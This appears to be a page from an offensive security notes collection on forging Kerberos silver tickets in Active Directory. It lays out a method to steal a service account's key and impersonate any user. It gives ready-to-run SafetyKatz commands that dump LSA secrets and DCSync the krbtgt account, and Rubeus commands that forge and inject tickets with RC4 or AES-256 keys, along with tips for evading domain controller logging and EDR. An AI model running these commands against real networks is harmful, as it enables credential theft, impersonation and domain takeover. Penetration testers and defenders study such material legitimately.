>**ℹ️ Info:**
> Short-term persistence, machine account passwords are rotated by default every 30 days.
> 
> Very good if OPSEC is needed since it won't interact with the domain controller.
---
# Methodology
>1. Retrieve the AES-256 key or RC4 hash of the service account.
>2. Forge and inject the ticket.
>3. Impersonate any user and access any service on the machine.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz

**Retrieve the AES-256 key of the service account:**
```cmd
SafetyKatz.exe '"lsadump::lsa /patch"'
SafetyKatz.exe '"lsadump::dcsync /user:contoso\krbtgt"'
```

## Rubeus
**Forge a silver ticket:**
```cmd
# With an NTLM hash (Usually flagged by EDRs)
Rubeus.exe silver /service:http/us-dc.us.contoso.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /user:Administrator /domain:us.contoso.local /sid:S-1-5-21-210670787-2521448726-163245708 /ldap /ptt

# With an AES-256 key (Admin cmd required)
Rubeus.exe silver /service:http/us-dc.us.contoso.local /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /user:Administrator /domain:us.contoso.local /sid:S-1-5-21-210670787-2521448726-163245708 /ldap /ptt
```

>**ℹ️ Info:**
>We use the domain SID in this case to avoid Rubeus getting confused when in a multi-domain enviroment.